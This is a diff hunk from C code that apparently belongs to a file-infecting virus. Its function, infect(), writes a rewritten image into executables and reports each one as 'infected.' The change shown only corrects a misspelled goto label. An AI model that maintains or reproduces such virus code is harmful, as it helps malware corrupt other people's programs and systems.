@@ -642,7 +642,7 @@ int infect(void)
          if (!iat.writeFile(infected_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
          {
             printf("\tFailed to write %s.\n", CVECTOR_CAST(&new_filename, char *));
-            goto infeced_file_close;
+            goto infected_file_close;
          }
 
          printf("\t%s infected.\n", executable);
